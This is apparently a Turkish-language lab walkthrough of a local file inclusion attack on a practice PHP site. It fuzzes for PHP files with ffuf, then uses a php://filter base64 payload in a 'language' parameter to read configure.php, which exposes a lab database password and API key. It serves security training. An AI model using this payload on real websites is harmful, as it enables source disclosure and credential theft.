# PHP Filters

## Fuzzing for PHP Files

!!! warning

    LFI uygulamasında [200](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/200) OK dışındaki yanıt kodları da hesaba katılmalıdır:

    * [301](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/301) Moved Permanently
    * [302](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302) Found
    * [403](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403) Forbidden

```sh
my@attack:~$ ffuf -ic -w /usr/local/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u "http://94.237.59.180:37581/FUZZ.php"
```

```output title="Output"
index                   [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 74ms]
en                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 67ms]
es                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 68ms]
configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 71ms]
```

## Source Code Disclosure

!!! warning

    Sunucu, dosya uzantısını eklemiyor ise biz eklemeliyiz.

Fuzzing ile elde edilen bir PHP dosyasına LFI saldırısı uygulamak için [PHP Base64 Conversion Filter](https://www.php.net/manual/en/filters.convert.php) kullanılabilir:

```sh
my@attack:~$ firefox "http://94.237.59.180:37581/index.php?language=php://filter/read=convert.base64-encode/resource=configure"
```

Kaynak kod görüntülenerek elde edilen Base64 dizisi çözülür:

```sh
my@attack:~$ echo -n PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ3Bhc3N3b3JkJywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7Cg== | base64 -d
```

```php title="Output" hl_lines="9-12 15"
<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

$config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'password',
  'DB_DATABASE' => 'blogdb'
);

$API_KEY = "Awew242GDshrf46+35/k";
```
